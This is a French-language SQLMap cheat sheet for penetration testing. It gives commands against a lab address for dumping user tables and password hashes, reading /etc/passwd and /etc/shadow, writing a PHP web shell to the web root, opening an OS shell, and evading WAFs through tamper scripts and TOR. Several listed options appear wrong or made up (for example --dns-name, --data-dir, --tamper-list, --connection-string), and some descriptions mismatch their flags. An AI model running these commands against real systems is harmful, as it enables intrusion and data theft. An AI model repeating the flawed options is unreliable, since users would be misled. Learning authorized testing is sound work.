# SQLMap Cheat Sheet

## Overview

SQLMap est un outil de test d'intrusion open-source utilisé pour :

- Détecter les vulnérabilités d'injection SQL.
- Exploiter les failles d'injection SQL.
- Prendre le contrôle des serveurs de base de données.
- Extraire le contenu des bases de données.
- Réaliser des évaluations de sécurité autorisées.

SQLMap fournit :

- La détection automatique des techniques d'injection SQL.
- Le support de multiples systèmes de gestion de base de données.
- Des capacités d'extraction de données.
- Des opérations de lecture/écriture de fichiers.
- L'exécution de commandes sur le serveur de base de données.

```text
Utilisez SQLMap uniquement contre des systèmes que vous possédez ou pour lesquels vous avez une autorisation explicite de test.
```

---

# 1. Starting SQLMap

## Syntaxe de base

```bash
sqlmap [options]
```

## Afficher l'aide

```bash
sqlmap -h
```

## Afficher la version

```bash
sqlmap --version
```

## Afficher l'aide verbose

```bash
sqlmap -hh
```

## Mettre à jour SQLMap

```bash
sqlmap --update
```

Met à jour vers la dernière version du repository.

---

# 2. Target Specification

## Spécifier l'URL cible

```bash
sqlmap -u <URL>
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/vuln.php?id=1"
```

## Spécifier l'URL cible avec paramètres

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1&name=test"
```

## Spécifier une requête POST

```bash
sqlmap -u <URL> --data <POST-data>
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/login.php" --data "username=admin&password=test"
```

## Spécifier un cookie

```bash
sqlmap -u <URL> --cookie <cookie>
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/admin.php" --cookie "PHPSESSID=abc123"
```

## Spécifier un User-Agent

```bash
sqlmap -u <URL> --user-agent <agent>
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --user-agent "Mozilla/5.0"
```

## Spécifier des headers HTTP

```bash
sqlmap -u <URL> --headers <headers>
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/page.php" --headers "X-Forwarded-For: 127.0.0.1"
```

## Spécifier un proxy

```bash
sqlmap -u <URL> --proxy <proxy>
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --proxy "http://127.0.0.1:8080"
```

## Spécifier les credentials du proxy

```bash
sqlmap -u <URL> --proxy <proxy> --proxy-cred <credentials>
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/page.php" --proxy "http://127.0.0.1:8080" --proxy-cred "user:pass"
```

## Spécifier un proxy TOR

```bash
sqlmap -u <URL> --tor
```

## Spécifier un fichier de requête

```bash
sqlmap -r <request-file>
```

Exemple :

```bash
sqlmap -r request.txt
```

## Spécifier plusieurs cibles

```bash
sqlmap -m <targets-file>
```

Où `targets.txt` contient une URL par ligne.

---

# 3. Injection Detection

## Tester l'injection SQL

```bash
sqlmap -u <URL>
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1"
```

## Tester un paramètre spécifique

```bash
sqlmap -u <URL> -p <parameter>
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1&name=test" -p id
```

## Tester tous les paramètres

```bash
sqlmap -u <URL> --test-skip <parameter>
```

Ignore des paramètres spécifiques pendant le test.

## Spécifier la technique d'injection

Les techniques incluent :

- `B` - Boolean-based blind
- `E` - Error-based
- `U` - UNION query
- `S` - Stacked queries
- `T` - Time-based blind
- `Q` - Inline queries

```bash
sqlmap -u <URL> --technique <techniques>
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --technique BEU
```

## Spécifier le niveau de risque

Niveaux 1-3 (par défaut est 1) :

- 1 - Tests de base
- 2 - Ajoute des tests time-based
- 3 - Ajoute des tests OR-based

```bash
sqlmap -u <URL> --risk <level>
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --risk 2
```

## Spécifier le niveau de tests

Niveaux 1-5 (par défaut est 1) :

- Des niveaux plus élevés testent plus de paramètres et cookies

```bash
sqlmap -u <URL> --level <level>
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --level 3
```

## Ignorer la protection WAF/IPS

```bash
sqlmap -u <URL> --skip-waf
```

## Utiliser des scripts tamper

```bash
sqlmap -u <URL> --tamper <script>
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --tamper space2comment
```

---

# 4. Database Enumeration

## Lister toutes les bases de données

```bash
sqlmap -u <URL> --dbs
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --dbs
```

## Lister les tables dans la base de données actuelle

```bash
sqlmap -u <URL> --tables
```

## Lister les tables dans une base de données spécifique

```bash
sqlmap -u <URL> -D <database> --tables
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb --tables
```

## Lister les colonnes dans une table spécifique

```bash
sqlmap -u <URL> -D <database> -T <table> --columns
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb -T users --columns
```

## Extraire une table spécifique

```bash
sqlmap -u <URL> -D <database> -T <table> --dump
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb -T users --dump
```

## Extraire toutes les tables

```bash
sqlmap -u <URL> -D <database> --dump-all
```

## Extraire des colonnes spécifiques

```bash
sqlmap -u <URL> -D <database> -T <table> -C <columns> --dump
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb -T users -C username,password --dump
```

## Compter les entrées dans une table

```bash
sqlmap -u <URL> -D <database> -T <table> --count
```

## Obtenir le schéma de la base de données

```bash
sqlmap -u <URL> --schema
```

## Obtenir le schéma d'une base de données spécifique

```bash
sqlmap -u <URL> -D <database> --schema
```

---

# 5. User and Privilege Enumeration

## Lister les utilisateurs de la base de données

```bash
sqlmap -u <URL> --users
```

## Lister les privilèges des utilisateurs

```bash
sqlmap -u <URL> --privileges
```

## Lister les privilèges d'un utilisateur spécifique

```bash
sqlmap -u <URL> --privileges -U <username>
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --privileges -U root
```

## Lister les mots de passe des utilisateurs

```bash
sqlmap -u <URL> --passwords
```

## Obtenir l'utilisateur actuel

```bash
sqlmap -u <URL> --current-user
```

## Obtenir la base de données actuelle

```bash
sqlmap -u <URL> --current-db
```

## Vérifier si l'utilisateur est DBA

```bash
sqlmap -u <URL> --is-dba
```

## Lister les rôles

```bash
sqlmap -u <URL> --roles
```

---

# 6. Database System Information

## Obtenir la bannière de la base de données

```bash
sqlmap -u <URL> --banner
```

## Obtenir le hostname du serveur de base de données

```bash
sqlmap -u <URL> --hostname
```

## Obtenir l'adresse IP du serveur de base de données

```bash
sqlmap -u <URL> --dns-name
```

## Obtenir la version du serveur de base de données

```bash
sqlmap -u <URL> --version
```

## Obtenir le système d'exploitation du serveur de base de données

```bash
sqlmap -u <URL> --os
```

## Obtenir le répertoire de données du serveur de base de données

```bash
sqlmap -u <URL> --data-dir
```

---

# 7. File Operations

## Lire un fichier depuis le serveur de base de données

```bash
sqlmap -u <URL> --file-read <remote-path>
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --file-read "/etc/passwd"
```

## Écrire un fichier sur le serveur de base de données

```bash
sqlmap -u <URL> --file-write <local-path> --file-dest <remote-path>
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --file-write shell.php --file-dest "/var/www/html/shell.php"
```

## Lire plusieurs fichiers

```bash
sqlmap -u <URL> --file-read "/etc/passwd,/etc/shadow"
```

---

# 8. Command Execution

## Exécuter une commande du système d'exploitation

```bash
sqlmap -u <URL> --os-cmd <command>
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --os-cmd "whoami"
```

## Exécuter une commande du système d'exploitation avec sortie

```bash
sqlmap -u <URL> --os-cmd "id"
```

## Obtenir un shell du système d'exploitation

```bash
sqlmap -u <URL> --os-shell
```

Fournit un shell interactif sur le serveur de base de données.

## Obtenir un shell SQL

```bash
sqlmap -u <URL> --sql-shell
```

Fournit un shell SQL interactif.

## Exécuter une commande PowerShell

```bash
sqlmap -u <URL> --os-cmd <powershell-command>
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --os-cmd "powershell -c Get-Process"
```

---

# 9. Advanced Options

## Spécifier le système de gestion de base de données

```bash
sqlmap -u <URL> --dbms <dbms>
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --dbms mysql
```

DBMS supportés :

- MySQL
- PostgreSQL
- Oracle
- Microsoft SQL Server
- SQLite
- Microsoft Access
- IBM DB2
- SAP MaxDB
- Sybase
- Firebird

## Spécifier l'utilisateur de la base de données

```bash
sqlmap -u <URL> --dbms-user <username>
```

## Spécifier le mot de passe de la base de données

```bash
sqlmap -u <URL> --dbms-pass <password>
```

## Spécifier le port de la base de données

```bash
sqlmap -u <URL> --dbms-port <port>
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --dbms-port 3306
```

## Spécifier une chaîne de connexion

```bash
sqlmap -u <URL> --connection-string <string>
```

## Limiter le nombre d'entrées

```bash
sqlmap -u <URL> --dump -D <database> -T <table> --start <start> --stop <stop>
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb -T users --dump --start 1 --stop 10
```

## Première entrée à récupérer

```bash
sqlmap -u <URL> --dump -D <database> -T <table> --first <entry>
```

## Dernière entrée à récupérer

```bash
sqlmap -u <URL> --dump -D <database> -T <table> --last <entry>
```

## Exclure des colonnes de l'extraction

```bash
sqlmap -u <URL> --dump -D <database> -T <table> --exclude-columns <columns>
```

## Rechercher des bases de données spécifiques

```bash
sqlmap -u <URL> --dbs --search
```

## Rechercher des tables spécifiques

```bash
sqlmap -u <URL> --tables --search
```

## Rechercher des colonnes spécifiques

```bash
sqlmap -u <URL> --columns --search
```

---

# 10. Output and Logging

## Sauvegarder la sortie dans un fichier

```bash
sqlmap -u <URL> -o
```

## Spécifier le répertoire de sortie

```bash
sqlmap -u <URL> --output-dir <directory>
```

## Sortie verbose

Niveaux 0-6 (par défaut est 1) :

```bash
sqlmap -u <URL> -v <level>
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" -v 3
```

## Afficher le trafic

```bash
sqlmap -u <URL> --traffic
```

## Afficher les requêtes HTTP

```bash
sqlmap -u <URL> --show-requests
```

## Analyser les cibles depuis le log proxy Burp

```bash
sqlmap -u <URL> --log-file <burp-log>
```

## Vider le fichier de session

```bash
sqlmap -u <URL> --flush-session
```

## Sauvegarder la session

```bash
sqlmap -u <URL> --save-config <config-file>
```

## Charger la session

```bash
sqlmap -u <URL> --load-config <config-file>
```

---

# 11. Common Attack Scenarios

## Test d'injection SQL de base

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1"
```

## Énumérer les bases de données

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --dbs
```

## Extraire la table users

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb -T users --dump
```

## Obtenir la bannière de la base de données

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --banner
```

## Exécuter une commande du système d'exploitation

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --os-cmd "whoami"
```

## Lire /etc/passwd

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --file-read "/etc/passwd"
```

## Obtenir un shell du système d'exploitation

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --os-shell
```

## Injection POST

```bash
sqlmap -u "http://192.168.1.10/login.php" --data "username=admin&password=test"
```

## Injection dans le cookie

```bash
sqlmap -u "http://192.168.1.10/admin.php" --cookie "PHPSESSID=abc123"
```

## Injection dans le header

```bash
sqlmap -u "http://192.168.1.10/page.php" --headers "X-Forwarded-For: 127.0.0.1"
```

## Proxy TOR

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --tor
```

## Utiliser un script tamper

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --tamper space2comment
```

---

# 12. Practical Workflows

## Flux de travail de base d'injection SQL

```text
1. Identifier l'URL cible avec des paramètres.
2. Tester l'injection SQL avec SQLMap.
3. Énumérer les bases de données.
4. Énumérer les tables dans la base de données cible.
5. Énumérer les colonnes dans la table cible.
6. Extraire le contenu de la table.
7. Documenter les résultats.
```

## Exemple : Énumération complète

```bash
# Tester l'injection SQL
sqlmap -u "http://192.168.1.10/page.php?id=1"

# Lister les bases de données
sqlmap -u "http://192.168.1.10/page.php?id=1" --dbs

# Lister les tables dans la base de données
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb --tables

# Lister les colonnes dans la table
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb -T users --columns

# Extraire la table
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb -T users --dump
```

## Exemple : Injection POST

```bash
# Tester les paramètres POST
sqlmap -u "http://192.168.1.10/login.php" --data "username=admin&password=test"

# Énumérer les bases de données
sqlmap -u "http://192.168.1.10/login.php" --data "username=admin&password=test" --dbs

# Extraire la table users
sqlmap -u "http://192.168.1.10/login.php" --data "username=admin&password=test" -D testdb -T users --dump
```

## Exemple : Injection dans le cookie

```bash
# Tester le paramètre de cookie
sqlmap -u "http://192.168.1.10/admin.php" --cookie "PHPSESSID=abc123"

# Énumérer les bases de données
sqlmap -u "http://192.168.1.10/admin.php" --cookie "PHPSESSID=abc123" --dbs
```

## Exemple : Opérations de fichiers

```bash
# Lire un fichier depuis le serveur
sqlmap -u "http://192.168.1.10/page.php?id=1" --file-read "/etc/passwd"

# Écrire un fichier sur le serveur
sqlmap -u "http://192.168.1.10/page.php?id=1" --file-write shell.php --file-dest "/var/www/html/shell.php"
```

## Exemple : Exécution de commandes

```bash
# Exécuter une commande
sqlmap -u "http://192.168.1.10/page.php?id=1" --os-cmd "whoami"

# Obtenir un shell du système d'exploitation
sqlmap -u "http://192.168.1.10/page.php?id=1" --os-shell
```

---

# 13. Common Commands Reference

| Command | Description |
|---|---|
| `sqlmap -h` | Afficher l'aide |
| `sqlmap --version` | Afficher la version |
| `sqlmap -u <URL>` | Spécifier l'URL cible |
| `sqlmap -r <file>` | Spécifier un fichier de requête |
| `sqlmap --data <data>` | Spécifier les données POST |
| `sqlmap --cookie <cookie>` | Spécifier un cookie |
| `sqlmap --dbs` | Lister toutes les bases de données |
| `sqlmap --tables` | Lister les tables |
| `sqlmap --columns` | Lister les colonnes |
| `sqlmap --dump` | Extraire le contenu de la table |
| `sqlmap --banner` | Obtenir la bannière de la base de données |
| `sqlmap --current-user` | Obtenir l'utilisateur actuel |
| `sqlmap --current-db` | Obtenir la base de données actuelle |
| `sqlmap --users` | Lister les utilisateurs de la base de données |
| `sqlmap --passwords` | Lister les mots de passe |
| `sqlmap --privileges` | Lister les privilèges |
| `sqlmap --file-read <path>` | Lire un fichier depuis le serveur |
| `sqlmap --file-write <file>` | Écrire un fichier sur le serveur |
| `sqlmap --os-cmd <cmd>` | Exécuter une commande du système d'exploitation |
| `sqlmap --os-shell` | Obtenir un shell du système d'exploitation |
| `sqlmap --sql-shell` | Obtenir un shell SQL |
| `sqlmap --tamper <script>` | Utiliser un script tamper |
| `sqlmap --tor` | Utiliser un proxy TOR |
| `sqlmap --proxy <proxy>` | Utiliser un proxy |
| `sqlmap -v <level>` | Définir le niveau de verbosité |
| `sqlmap --level <level>` | Définir le niveau de test |
| `sqlmap --risk <level>` | Définir le niveau de risque |
| `sqlmap --technique <tech>` | Définir la technique d'injection |
| `sqlmap --dbms <dbms>` | Spécifier le DBMS |
| `sqlmap --update` | Mettre à jour SQLMap |

---

# 14. Tamper Scripts

## Lister les scripts tamper disponibles

```bash
sqlmap --tamper-list
```

## Scripts tamper communs

- `space2comment` - Remplace l'espace par `/**/`
- `space2dash` - Remplace l'espace par `--`
- `space2hash` - Remplace l'espace par `#`
- `space2plus` - Remplace l'espace par `+`
- `space2randomblank` - Remplace l'espace par un espace aléatoire
- `between` - Remplace `>` par `NOT BETWEEN 0 AND #`
- `charencode` - URL-encode tous les caractères
- `equaltolike` - Remplace `=` par `LIKE`
- `lowercase` - Convertit en minuscules
- `uppercase` - Convertit en majuscules
- `randomcase` - Randomise la casse
- `base64encode` - Encode le payload en Base64

## Utiliser un script tamper

```bash
sqlmap -u <URL> --tamper <script>
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --tamper space2comment
```

## Utiliser plusieurs scripts tamper

```bash
sqlmap -u <URL> --tamper <script1>,<script2>
```

Exemple :

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --tamper space2comment,base64encode
```

---

# 15. Database-Specific Options

## MySQL

```bash
sqlmap -u <URL> --dbms mysql
```

## PostgreSQL

```bash
sqlmap -u <URL> --dbms postgresql
```

## Oracle

```bash
sqlmap -u <URL> --dbms oracle
```

## Microsoft SQL Server

```bash
sqlmap -u <URL> --dbms mssql
```

## SQLite

```bash
sqlmap -u <URL> --dbms sqlite
```

## Microsoft Access

```bash
sqlmap -u <URL> --dbms access
```

## IBM DB2

```bash
sqlmap -u <URL> --dbms db2
```

## SAP MaxDB

```bash
sqlmap -u <URL> --dbms maxdb
```

## Sybase

```bash
sqlmap -u <URL> --dbms sybase
```

## Firebird

```bash
sqlmap -u <URL> --dbms firebird
```

---

# 16. Troubleshooting

## Aucune injection SQL détectée

- Essayez différents paramètres.
- Augmentez le niveau : `--level 3`
- Augmentez le risque : `--risk 2`
- Utilisez des scripts tamper.
- Testez manuellement avec différents payloads.

## WAF/IPS bloque

- Utilisez des scripts tamper.
- Utilisez `--skip-waf`.
- Utilisez un proxy ou TOR.
- Ralentissez les requêtes : `--delay 1`
- Utilisez un User-Agent aléatoire : `--random-agent`

## Performance lente

- Réduisez le niveau : `--level 1`
- Réduisez le risque : `--risk 1`
- Limitez les entrées : `--start 1 --stop 10`
- Utilisez des techniques spécifiques : `--technique B`

## Erreurs de connexion

- Vérifiez l'URL cible.
- Vérifiez la connectivité réseau.
- Vérifiez les paramètres du proxy.
- Augmentez le timeout : `--timeout 30`

## Faux positifs

- Vérifiez l'injection manuellement.
- Utilisez différentes techniques.
- Vérifiez les codes de réponse.
- Examinez la sortie SQLMap attentivement.

---

# 17. Security Best Practices

## Vérifiez toujours les résultats

- Testez l'injection manuellement.
- Vérifiez le contenu de la base de données.
- Vérifiez les faux positifs.
- Documentez tous les résultats.

## Respectez les limites légales

- Testez uniquement les systèmes que vous possédez.
- Obtenez une autorisation explicite.
- Suivez la divulgation responsable.
- Documentez toutes les activités.

## Maintenez un environnement de laboratoire

- Utilisez des machines virtuelles.
- Isolez les réseaux de test.
- Conservez des snapshots propres.
- Documentez les configurations.

## Maintenez les outils à jour

- Mettez régulièrement à jour SQLMap.
- Restez informé des nouvelles techniques.
- Suivez les advisories de sécurité.
- Testez dans des environnements contrôlés.

## Minimisez l'impact

- Utilisez le niveau de risque le plus bas possible.
- Limitez l'extraction de données.
- Évitez les opérations destructives.
- Testez pendant les fenêtres de maintenance.

---

# 18. Important Reminders

- Obtenez toujours une autorisation explicite avant d'utiliser SQLMap.
- Testez d'abord dans un environnement de laboratoire contrôlé.
- Toutes les injections détectées ne sont pas exploitables.
- Certaines opérations peuvent impacter les performances de la base de données.
- Maintenez SQLMap à jour régulièrement.
- Validez les résultats manuellement ; ne vous fiez pas uniquement aux résultats automatisés.
- Documentez toutes les actions, commandes et résultats.
- Préservez les preuves originales et les logs.
- Respectez le périmètre et les règles d'engagement.
- Comprenez les implications légales et éthiques de vos actions.

---

# 19. Quick Reference Examples

## Test de base

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1"
```

## Lister les bases de données

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --dbs
```

## Lister les tables

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --tables
```

## Extraire une table

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" -D testdb -T users --dump
```

## Obtenir la bannière

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --banner
```

## Exécuter une commande

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --os-cmd "whoami"
```

## Obtenir un shell du système d'exploitation

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --os-shell
```

## Injection POST

```bash
sqlmap -u "http://192.168.1.10/login.php" --data "username=admin&password=test"
```

## Utiliser tamper

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --tamper space2comment
```

## Utiliser TOR

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --tor
```

## Sortie verbose

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" -v 3
```

## Test de niveau élevé

```bash
sqlmap -u "http://192.168.1.10/page.php?id=1" --level 3 --risk 2
```

---

# 20. Additional Resources

## Documentation officielle SQLMap

```text
https://sqlmap.org/
```

## Repository GitHub SQLMap

```text
https://github.com/sqlmapproject/sqlmap
```

## Wiki SQLMap

```text
https://github.com/sqlmapproject/sqlmap/wiki
```

## OWASP SQL Injection

```text
https://owasp.org/www-community/attacks/SQL_Injection
```

## PortSwigger SQL Injection

```text
https://portswigger.net/web-security/sql-injection
```
